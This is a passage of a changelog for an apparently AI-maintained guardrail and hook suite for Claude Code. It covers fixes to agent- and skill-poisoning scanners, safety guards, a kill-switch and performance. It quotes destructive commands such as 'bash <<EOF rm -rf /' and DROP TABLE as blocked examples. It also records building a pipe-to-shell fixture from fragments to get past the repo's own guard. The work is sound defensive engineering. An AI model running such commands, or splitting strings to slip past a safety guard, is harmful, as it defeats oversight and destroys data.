Windows python defaults stdout to the ANSI codepage and raises UnicodeEncodeError on those characters, losing ALL of the output, which is exactly what the two --target all assertions report when they say the sweep is missing events and the blocking column. The runner log corroborates it directly: the harness's em dash arrives mojibaked in the diagnostic output. Same three-line guard as its siblings, honouring an explicit setting. - [2.27.36] - 2026-08-18 — fix(tests): the Windows scanner failures were a TRANSPORT bug in the harness, and my two previous fixes for them were both wrong — the diagnostic shipped in v2.27.33 has now answered the question those releases guessed at, and it refutes both of them. On the runner the paths arrive fine: HOOKS_DIR reaches python as a drive-lettered path, isdir on it is True, the shared library imports successfully, and the project-level base resolves to a real directory. So neither the cwd normalisation in v2.27.32 nor the sys.path normalisation in v2.27.33 addressed anything. They are harmless and mildly defensive and are kept on that basis, but they fixed nothing I claimed at the time, and the honest lesson is that the diagnostic should have been built before the first fix rather than after the second. The actual mechanism is how a path TRAVELS. MSYS rewrites paths passed as environment variables in transit, which the diagnostic proves directly, but it never touches string content inside a JSON payload. The evidence is two assertions in the same file using the same mktemp directory and disagreeing on Windows: the one that passes the directory through HOME succeeds because that value is converted, while the one that puts it in the payload cwd field fails because native Windows python cannot resolve an MSYS virtual path like slash-tmp. This repo already knew the underlying fact and had written it down in the workflow, in a comment about keeping recon output workspace-relative rather than in tmp, which I read earlier in the same investigation without connecting it. A native_path helper now converts such a path with cygpath, the documented MSYS tool that ships with Git for Windows, and is a plain passthrough off Windows. It is applied at the four transport points the recon actually flags rather than to every payload in the suite: the agent-poisoning scan helper, the project-level skills scan, both config-scan agent-file cases, and the shared-resolver import, whose path was INTERPOLATED into a python -c program and so was neither an env var nor an argument and got converted by nothing. One of those repairs a test that was passing for the wrong reason: the config-scan false-positive case asserts the ABSENCE of a finding, so on Windows an unresolvable directory made it pass vacuously while its positive twin failed on the identical setup. Both now use a resolvable path, so the negative one proves something again. This is the same class as the CRLF assertion fixed in v2.27.34 - a harness defect that read as a product defect, invisible on the two platforms where the suite was green, and it means the poisoning scanners were never broken on Windows in the way the recon appeared to say. 3762 tests passing.
- [2.27.35] - 2026-08-18 — fix(rules): the behavioural rules were path-scoped, so the Verification Gate was absent until a session happened to open a code file — configs/universal/supercharger.md shipped with paths: frontmatter, which makes Claude Code load a rules file LAZILY: only once a matching file is touched. That file carries the Verification Gate, Scope Discipline, Error Recovery and Forbidden Patterns, none of which are specific to code. So in installer-mode installs every turn before the first matching file ran without them, silently, and nothing reported it — the user who found this saw the two files appearing mid-conversation and correctly read it as something quietly broken. The frontmatter is gone; the file now loads at session start like guardrails.md and economy.md beside it in the same configs/universal directory, which is the inconsistency that gave it away. Roughly 939 estimated tokens become permanently resident, the same order as those two. Plugin-mode installs were already unaffected in substance, since prompt-layer-inject emits configs/universal verbatim at SessionStart — but it emitted the frontmatter as literal YAML into the context, so they gain a small cleanup. Role files stay scoped, deliberately: developer.md is code output style and stack detection, worthless in a non-coding session. Not every role is scoped and that is also correct rather than an oversight — pm, student and writer carry no code globs, and scoping them by ts and py patterns would mean they never loaded for the work they exist for. A test now pins both directions so neither can drift back. The second half is deactivation. Rules are read once at session start, so moving the files off disk — which sc-toggle already did, correctly, and which is not rebuilt here — cannot unload them from a conversation already running. Text in the context window cannot be unread. A new UserPromptSubmit hook, sc-toggle-notice, states the override instead: sc-toggle writes a one-shot marker on both off and on, and the hook announces it on the next prompt and deletes the marker. One-shot matters, because a per-turn injection would mean off kept talking every turn, which is not off. It is symmetric by request: without the on half, off would be instant while reactivation silently waited for a restart. This hook is the single deliberate carve-out in the kill-switch, and the reason is structural: lib-suppress and lib-timing both exit at SOURCE TIME when the flag is set — that is how the other 132 registered hooks deactivate, and it was verified as complete coverage before this was designed — so a hook that must speak precisely WHEN the switch is off cannot source either. Adding the missing source line would read as a tidy-up and would silently disable the hook in the only case it exists for, so a test asserts it still announces with the flag set, and another asserts it does not source those libs. The carve-out is kept minimal: no payload is parsed, no user input is read, nothing is written except the removal of its own marker, and with no marker present it is a single file test and an exit. What this does NOT do is claim erasure: the earlier rules remain visible in the transcript and the notice overrides them behaviourally. The next session starts genuinely clean, which is the existing file stash doing its job. Eleven assertions ride along, seven of which fail against the pre-change tree; one of them passed vacuously at first because grep on a missing file also returns non-zero, so it now asserts the hook exists before asking what it sources. 3762 tests passing.
- [2.27.34] - 2026-08-18 — fix(tests): the CRLF check was flagging files that provably had no CR, on the one platform it exists to protect — the Windows recon has been failing this assertion for a long time, naming assets/demo/try.sh. The diagnostic added last release settles what was happening, and the answer is that the file was never the problem. On the runner, in the same job, a byte-level read reports try.sh holding ZERO carriage returns both BEFORE and AFTER the suite. The assertion still fails. Run in isolation, with no parallel jobs at all, it still fails — 10 passed, 1 failed — so this was never a parallelism artifact either. And its failure names not one file but essentially every tracked shell script in the repository: try.sh, tools/trust-mcp.sh, tools/update.sh, tools/webhook-setup.sh, uninstall.sh and more. A detector that flags nearly everything while a byte-level read of the same files finds nothing is reporting its own defect. The mechanism was grep with the -U flag and a carriage-return pattern, which behaves differently under Git Bash than under the ubuntu and macOS greps where this assertion passed throughout — which is exactly how a broken Windows check stayed invisible for so long, since the two platforms that could not detect the problem were the two that were green. A test whose subject is raw bytes now reads raw bytes: the file list still comes from git, but the scan is done in python with files opened in binary mode, no text-mode translation and no platform-specific grep flag anywhere in the path. That is the same method the CI diagnostic used to prove the files were clean, so the test and the diagnostic can no longer disagree. Verified in both directions rather than just the passing one, because replacing a false-positive detector with a detector that finds nothing would look identical from here: against a purpose-built tree containing a genuinely CRLF-terminated script it fails and names that file, and it leaves the clean file beside it alone. A second hypothesis dies here too. The same diagnostic sampled the working tree either side of the recon on the theory that a test running under four parallel jobs was mutating a tracked file. It is not: git reports only untracked build residue afterwards, two python cache directories and the suite log itself. The suite leaves tracked files alone, and that concern is closed. Worth recording how badly this one was misread along the way. It was first reported as passing on Windows, which was wrong — a macOS PASS had been read without filtering the log to the Windows job. It was then corrected to failing, which was right, but with the file assumed guilty. Only a measurement taken on the runner separated the file from the check. 3751 tests passing.
- [2.27.33] - 2026-08-18 — fix(scanners): v2.27.32 normalised the wrong three paths — the one on sys.path was left POSIX-shaped — the previous release normalised cwd and home_dir in the poisoning scanners and did NOT move the Windows recon: the same 22 failures came back, with the same four in the scanner cluster. The miss is now identified. HOOKS_DIR and HOOKS_DIR_PY are CUSTOM environment variables, and MSYS only rewrites the ones it recognises, so on Git Bash they reach python POSIX-shaped as slash-d-slash-a-slash-repo-slash-hooks. Windows python resolves a leading-slash path against the current drive, the directory does not exist, and the sys.path entry is therefore useless: the import of the shared pattern library fails and every scanner drops silently into its inline fallback. That is precisely what the recon has been reporting in words — the shared resolver is not importable — and it is the one path v2.27.32 did not touch, which is why that release changed nothing. All three scanners that put a directory on sys.path now normalise it first. Whether this also restores project-level agent and skill scanning is NOT claimed: those failures may share this cause or may not, and having already shipped one fix on a hypothesis that did not hold, this release does not make a second guess. A diagnostic rides along to settle it rather than reason about it from a machine that cannot run the code. It prints what the scanner actually sees on the runner — the bash-side hooks directory, the exact string python receives for it, whether that directory exists from python's point of view, whether the shared import resolves, and whether each base the resolver globs is a directory — and then runs the scanner against a genuinely poisoned project-level agent definition and reports its exit code. If the import line reads OK and the project base still reads false, the remaining cause is in the globbing rather than the path form, and the next change will be aimed at a measurement instead of an inference. Two things worth recording about the process. The recon's failure list lives in an uploaded build ARTIFACT rather than the step log, so it reads as green and had gone unexamined; it is 3729 passing and 22 failing. And writing the diagnostic tripped this repo's own safety guard, correctly: the probe needs a poisoned agent file containing a pipe-to-shell, and a literal one in the command was blocked, so the fixture assembles the string from fragments. A guard that fires on a security fixture being written is the guard working, not a false positive to be tuned away. 3751 tests passing.
- [2.27.32] - 2026-08-17 — fix(scanners): on Windows the poisoning scanners reported CLEAN having scanned nothing — Claude Code launches hooks through Git Bash, so a payload cwd arrives POSIX-shaped as slash-d-slash-a-slash-repo. Native Windows python resolves a leading-slash path against the CURRENT DRIVE, so that becomes D-colon-backslash-d-backslash-a-backslash-repo, a path that does not exist. Every is_dir check then returns False, the project-level base is skipped, and the scanner returns clean without having looked at a single file. Silent, and on a security scanner. Four hooks were affected — agent-poisoning-scanner, skill-poisoning-scanner, config-scan and workflow-guard — plus the shared resolve_agent_defs they lean on, and the Windows recon suite had been reporting it in plain words for some time: project-level agents slash not scanned, the same for skills slash, and a real injection inside an agent file missed outright. path-guard and safety already normalise this exact form, and path-guard's helper even carries the measurements taken on a windows-latest runner; these four never got it, which is the cross-file drift class this repo keeps rediscovering. All of them now normalise before building any path, through a helper gated on os.name so POSIX is provably untouched — a directory literally named slash-c is legitimate on Linux and must never be rewritten. Four assertions ride along, all four failing against the pre-fix code: that every scanner joining a payload cwd normalises first, that the SHARED resolver normalises rather than relying on its callers, that the mapping is correct across the Git Bash form, a bare drive, a POSIX home that must NOT match the single-letter rule, an already-native Windows path and the empty string, and that the real function stays inert off Windows. Because the normaliser is gated on platform it cannot be exercised directly from macOS, so the test extracts the identical transform with the gate removed to pin the mapping, and separately asserts the real one is a no-op here — which is the only honest way to test Windows semantics off Windows, and better than shipping on reasoning alone. The Windows runner still has to confirm it: this is a fix built on a mechanism that path-guard measured, not on a reproduction, since nothing Windows is answerable from macOS. How the list was obtained is worth recording, because it was not visible where anyone would look: the recon step uploads the suite output as a build ARTIFACT rather than printing it to the step log, so grepping the workflow log finds nothing and the job is green regardless, being report-only. Downloaded, it reads 3721 passing and 22 failing, down from the 29 carried in the notes. A correction rides with this. I previously reported that the line-endings test passes on Windows. It does not — I grepped the workflow log without filtering to the Windows job and read a macOS PASS as a Windows one. It still fails on assets slash demo slash try.sh, and the earlier diagnostic showing that file holding zero carriage returns was taken in an earlier step of the same job, so something between the two changes it. That is unresolved and is not claimed fixed here. 3751 tests passing.
- [2.27.31] - 2026-08-17 — perf(hooks): two more cwd reads off jq, and a 54-file refactor NOT done because the measurement said it was worthless — output-secrets-scanner and trace-compactor each forked jq twice per PostToolUse call: once for the whole of tool_response.stdout, which has to stay on jq because it is exactly the large escape-carrying value the fork-free reader is built to refuse, and once more for cwd, a short top-level field. The second one is now read through _json_get, whose prefix retry from v2.27.28 makes the fast path reachable even though these payloads carry command output and sit past the size gate. Deterministically verified with a fork-counting shim: 2 jq to 1 in both hooks, taking the PostToolUse:Bash chain from 6 interpreter forks to 4. No chain-level millisecond claim is made here, because the bare-bash floor measured 9.64ms in one run and 3.06ms in another on the same machine — the totals either side of this change are not comparable, and the fork count is the honest number. The more useful result is the refactor NOT done. Fifty-four hooks carry the identical jq cwd-extraction line and only seven source lib-json-fast, which looked like a large systematic win. Censusing the chains first killed it: the PreToolUse:Bash chain has only TWO interpreter forks in total across eighteen hooks, sixteen of them already fork-free, because the other fifty-odd hooks either are not on the Bash chains or exit at a pre-gate before reaching that line. Two fixture defects were found and corrected on the way here, both of which had already produced a confident wrong answer. The census that reported all eight remaining hooks forking zero interpreters was invalid: it invoked each hook through timeout, which does not exist on macOS, so the command failed and no hook ever ran — the uniform zeros were the tell, and this repo has already shipped a fix for exactly that assumption in its own code. And the first trace-compactor differential passed VACUOUSLY: every one of its twelve payloads produced no output at all, because the hook needs both a recognisable trace and at least 2000 characters, and a long plain log satisfies only the second. Re-run against real Python tracebacks and JavaScript stacks it compares 14 payloads with 6 actual compaction outputs, across compact and spaced JSON, cwd present and absent, and the stdout and output response shapes. output-secrets-scanner is differentially identical across 12 payloads with 5 secret detections actually firing, so its security behaviour is pinned rather than assumed. 3747 tests passing.
- [2.27.30] - 2026-08-17 — fix(hooks): two hooks decided session identity with a literal that only matches COMPACT json, and failed silently and differently when it did not match — three hooks extract the session id inline with the spelling "session_id":" — no space after the colon. The other two were not. context-advisor was the worse of the pair, because its failure is the per-session-scoping collision class this repo keeps hitting rather than a slowdown: the guard tested for "session_id", which a spaced payload DOES contain, but the strip below required the compact spelling, so it matched nothing and returned the WHOLE payload, and the following cut-to-first-quote reduced that to a bare open brace. Every session then shared one peak file named .ctx-advisor-peak-{ — measured directly, old code writes exactly that on a spaced payload while writing the correct .ctx-advisor-peak-sess-9 on a compact one. session-checkpoint failed open instead: with no match the entire debounce block was skipped, and the hook went back to running four git subprocesses plus a python fork on EVERY Write, Edit and Bash — including a git ls-files that walks the whole worktree. Measured with a fork-counting shim: 0 forks across 3 calls on compact json against 15 on spaced. A performance gate that silently disables itself is worse than no gate, because nothing reports it and the cost simply reappears. Both now match the colon, skip whitespace, require a quoted value, and refuse anything that is not a plausible id rather than letting it become a filename — all fork-free, and taking the FIRST occurrence rather than the last, since the top-level key is the one that owns the session and a copy inside a prompt or a transcript path must not win. Four assertions ride along in the session-scope-leak suite, three of which fail against the pre-fix hooks with the exact symptoms above, and the fourth pins budget-cap as the sibling that was already right so the parity cannot silently regress. The debounce test also proves it is not vacuous: with the debounce explicitly disabled the same call forks git 15 times. - [2.27.29] - 2026-08-17 — perf(bash-output-compactor): the field list carried the entire command output, and nothing ever read it — the consolidated @tsv extraction pulled four fields, and the fourth was the whole of tool_response.stdout. No line in the hook reads field 4, and it could not have been used even in principle, because @tsv escapes newlines — which is exactly why the raw stdout is re-extracted with its own jq further down. So on every triggered call, every byte of a long test run or a long git log was escaped by jq, copied into a shell variable, and then piped through THREE separate awk forks that only ever wanted fields 1 to 3. Dropping it leaves FIELDS at a few hundred bytes regardless of how much the command printed, and the three awk forks are replaced by parameter-expansion splits — %% and # are single scans and stay linear, and // is deliberately not used, the operator this repo has shipped four superlinear regressions with. The saving scales with output size, as the diagnosis predicts: an 80-line git log goes 59.82ms to 54.52ms, 1.10x, while a 3000-line run goes 158.15ms to 117.04ms, 1.35x, medians over five interleaved rounds. Fork accounting on the triggered path: awk 3 to 0. An honest correction to the ranking that led here, because the measurement over-stated this hook. On an ORDINARY command it forks ZERO times — a fork-free pre-gate scans raw stdin and exits before any of the above unless the command is a git log, a test runner or an install. The chain figure that put it near the top was measured with a git-log payload, which trips that gate, so this is a fix to the TRIGGERED path — the calls that follow a test run — and not to the per-call cost of every Bash invocation. That path is still worth fixing, since running tests is exactly when a session produces the most output, but it is not the every-call win the earlier number implied. Verified byte-identical to the previous version across 18 payloads: the 49 and 50 line boundary either side of the compaction threshold, output containing tabs, quotes, backslashes and unicode, a command containing a tab and a command containing a newline, empty output, a payload with no cwd that must fall back to workspace.current_dir, an ordinary non-triggering command, every trigger family, and a 3000-line run — with 14 compaction outputs actually emitted, so the comparison is not vacuous. Three assertions ride along, two of which fail against the pre-fix hook: awk forks stay at zero on the triggered path, the hook still compacts an 80-line git log, and the whole stdout cannot drift back into the field list. 3743 tests passing.
- [2.27.28] - 2026-08-17 — perf(lib-json-fast): the size gate sent every large payload to jq, including the ones that only wanted the session id — _json_fast_str refuses anything past 4096 bytes, correctly, because its slicing is greedy parameter expansion over the WHOLE payload and goes quadratic. But its callers all want a TOP-LEVEL field, and Claude Code puts those at the FRONT of the payload: session_id, transcript_path, cwd, then the bulky tool_input and tool_response. So a PostToolUse payload carrying a few KB of command output sat past the gate, and a hook needing nothing but the session id forked jq on every single call. _json_get now retries the fork-free read against a bounded 2KB PREFIX when the body is past the gate. That respects the reason the gate exists — the slicing runs over 2KB rather than 70KB — and it only ever ADDS a fast path, since a field that is not in the prefix falls through to exactly the jq call that ran before. The depth check is unchanged and still applies, so a nested key cannot be mistaken for a top-level one. Tunable with SUPERCHARGER_JSON_FAST_PREFIX. The dangerous part of truncation is guarded explicitly: cutting a payload mid-string can leave a value with no closing quote, and the slicer would then hand back the fragment AS IF it were the whole value — a silently wrong session id or cwd, which is precisely the per-session-file scoping bug class this repo has hit repeatedly. A value read out of a truncated body is therefore only trusted when the body still contains it in fully QUOTED form; if the closing quote was cut off that match cannot occur, and the read is discarded in favour of jq. Verified against jq as the oracle across 32 lookups on 16 payloads — key at the front, key deliberately placed AFTER the prefix, the value straddling the boundary at eight separate pad lengths from 1900 to 2100, nested-only keys, keys duplicated at two depths, escaped and unicode values, absent keys and empty values — with zero disagreements, and the fork accounting proves the fast path is actually taken rather than quietly falling back: 1 jq fork becomes 0 on the front-key case, and stays 1 on the straddle and nested cases where the guards correctly refuse. The first caller converted is cache-health, which does real work only every 5th call yet paid BOTH its jq forks before that gate — 4 calls in 5 forked jq twice purely to build two filenames and then exit. Over a five-call cycle that is 10 jq forks; it is now 0, measured 30.06ms to 24.81ms median, 1.21x. Seven other hooks use _json_get and get the same benefit on the UserPromptSubmit path, the one the user waits on. A note on measurement, because this nearly shipped as a non-improvement: a three-round interleaved MEAN reported the change 2.2ms SLOWER, and only a seven-round median on the same machine showed the real 5.25ms gain. The machine was at 98 percent CPU from an unrelated process, and at the few-millisecond scale a mean over three rounds measures the load, not the code. Deterministic fork counts were what settled it first. 3740 tests passing.
- [2.27.27] - 2026-08-17 — perf(tool-history-tracker): the most expensive hook on the hottest chain forked python to record a success — tool-history-tracker cannot be pre-gated, because confidence-gate needs every tool call recorded, so its python fork was paid on EVERY PostToolUse for EVERY tool: measured at 42ms against a 2ms bare-bash floor, the single most expensive hook on the chain and the one item left after v2.27.26. It now takes a fork-free path for the success case and leaves python as the authority for everything else, 42ms to 19ms, which with the auto-compact fix takes the PostToolUse:Bash chain from 217ms to 173ms. The split is deliberately lopsided rather than clever. The fast path runs only when the payload is plainly shaped and carries no sign of failure, and the marker test is a fail-safe SUPERSET of python's own logic — interrupted, either error key, and every stderr marker it greps — checked against the WHOLE payload rather than the extracted stderr field, so a marker appearing anywhere, even inside a command string or in ordinary output, costs one python fork and gets the exact answer. Only the total absence of any of them takes the shortcut. Extraction refuses rather than guesses: a key that is absent, that occurs twice, whose value carries a backslash escape, or that runs past 200 characters hands straight back to python. The strips are # and %%, which are single scans and stay linear on a large payload, and the one global substitution runs only on the session id after it is already capped — this repo has shipped four superlinear regressions from that operator and none of them are repeated here. The entry format is treated as a contract, not a detail: confidence-gate substring-matches the literal success-false text, so json.dumps separators are reproduced exactly rather than approximated. Proven byte-identical to the previous version across 34 payloads with the timestamp normalised, covering every stderr marker individually, interrupted, the tool-level and response-level error keys, error set to null and to empty, a missing session id, an empty one, one over the 64-character cap, one carrying a unicode escape, a duplicated session_id key, a tool name that is not an identifier, an MCP tool name, a tool_response that is a string rather than an object, a 9KB payload, unicode output, malformed JSON and empty input — 27 entries written, 11 of them failures, across 6 history files, so the comparison is not vacuous. The new assertions fail against the pre-fix hook. Also corrects two stale claims in the Windows CI block: path-guard is no longer refusing nothing on Windows — the runner now measures root slash, root HOME, scp-of-key and expanded HOME all refused with rc=2, so the comment is kept in the past tense rather than left reading as a live security hole — and the POSIX-versus-Windows diagnostic could not test its own hypothesis, because MSYS rewrites a single-path env var in transit so python received the native form and never saw the slash-c-slash spelling the probe exists to measure. - [2.27.24] - 2026-08-17 — fix(lib-bounded-run): every bounded call that CAPTURED output waited the full budget — the killer subshell inherited the caller's stdout. When that stdout is a command-substitution pipe, which is exactly how both consumers call this (issues=$(sc_bounded_run 30 eslint $f) and the tsc capture in typecheck), bash cannot see EOF until every fd holder closes. Killing the subshell left its sleep orphaned to init, still holding the pipe, so a command that exited INSTANTLY stalled the capture for the entire budget. Measured with all linters stubbed: quality-gate 30.2s at budget 30 and 5.2s at budget 5, tracking the budget exactly; typecheck 21.4s at budget 20. After the fix: 0.50s, 0.13s and 0.34s. The killer never needed stdio at all and now runs with its own redirections. Shipped in v2.27.11 yesterday, so the blast radius is one day and the historical p50s (quality-gate 1757ms, typecheck 10.6s) predate it and stay valid as a baseline. quality-gate is synchronous and would have blocked outright; typecheck is asyncRewake and merely held a slot. The v2.27.11 latency test called sc_bounded_run DIRECTLY, and without a capture there is no pipe to hold, so it passed throughout while every captured call could hang — anything that only manifests through a command substitution has to be tested through one, and two tests now do. And it is timing-dependent: a first probe returned 0.02s and nearly retired the hypothesis; what settled it was sampling the process tree mid-stall and finding an orphaned sleep at ppid 1 beside the waiting hook. - [2.27.17] - 2026-08-16 — fix(cmd-normalize): the guards read heredoc bodies as commands, so writing a test fixture was blocked four times in one session — a heredoc body is data. Writing a file whose lines contain 'DROP TABLE users' and a hard git reset was refused twice by safety.sh and twice by git-safety.sh, for text destined for a file that no shell would ever run; those four entries are in this machine's own block ledger. A gate that fires on inert data is the kind people switch off, and a disabled gate protects nothing. Bodies are now stripped before matching, in the shared normalizer, so all four guards that source it (safety, git-safety, enforce-pkg-manager, commit-guard) get one answer with no cross-guard drift. The exception carries the safety argument and is tested at least as hard as the fix: a body handed to something that EXECUTES it is still code, so shells, language interpreters and database clients keep theirs — 'bash <<EOF rm -rf /' and 'psql <<EOF DROP TABLE' still block, including when the body is PIPED into a shell whose owner is a harmless cat. Herestrings (<<<) have no body and are untouched. Hot path unaffected: nothing forks unless the command contains a heredoc operator, and the fork count on an ordinary command is unchanged. The helper runs as a quoted heredoc rather than python3 -c with a double-quoted program — the first draft carried a backtick-quoted example in a docstring, so bash command-substituted it and the guard EXECUTED the text it was meant to inspect.. 3706 tests passing.
- [2.27.16] - 2026-08-16 — fix(lib-bounded-run): a timeout was reported as the command's own exit status when the machine was busy — the bound decided 'did it fire?' by asking whether the killer subprocess was still alive: alive meant still sleeping, so the command must have finished on its own. That is a race. A loaded macOS CI runner lost it: the killer had already SIGTERMed the command and simply had not exited yet, so an overrun returned 143 (128+SIGTERM) instead of 124 and no caller could tell a timeout from a command that happened to be signalled. The killer now STAMPS A MARKER before it signals, and the marker — a fact, not a guess about scheduling — is what says a timeout happened; without mktemp there is no marker and the command's own status is returned rather than a timeout that cannot be evidenced. Note this passed 15/15 locally even under eight CPU loaders, so the regression test does not repeat the run: it INJECTS the losing schedule with a copy of the library whose killer lingers after firing. Against the old liveness check that fails every time (measured: got 143, 143); against the marker it is irrelevant.. 3695 tests passing.

Measured on macOS: a bare 'docker ps' cost 21 forks and 74ms, the trigger path 18 forks and 108ms; now 5 forks / 37ms and 9 forks / 91ms. The skip test is a case statement, the matchers are [[ =~ ]] on the same POSIX ERE engine, the parent walk is parameter expansion checked against dirname across 9 path shapes, and the two config reads are one. Git Bash pays ~29ms per process START, so this is roughly half a second per gated command there. Verified by differential: all 38 corpus commands run through both the grep implementation and this one, 0 verdict or category mismatches, and that corpus now ships as a test so the next refactor of this matcher has the same safety net rather than a promise that one once existed. SECURITY (pre-existing, found in the same block): SKIP_CATS was never initialised, so an inherited environment variable seeded the skip list — a bare name like SKIP_CATS exported in a shell silently switched off whole categories of the gate. It is now config state, with SUPERCHARGER_HUMAN_GATE_SKIP as the namespaced override.. 3694 tests passing.

The live log on the development machine shows 15 such orphans (a bare '20', a bare 'File <stdin>, line 2, in <mod'); every line-wise reader counts them as events, and the 500-line rotation trims by line, so one noisy failure evicts real history. Detection rather than substitution: the patterns are POSIX EREs whose bracket classes python's re would mis-parse, so grep matches and a hit replaces the whole detail. The verdict is now memoized against a signature of what the script actually sees (HEAD, porcelain status, working diff, and the size/mtime of untracked files, which no diff contains). A PASS on an unchanged tree is skipped; a FAIL is RE-EMITTED from cache rather than skipped, so a failing verification keeps blocking every turn until it is fixed.
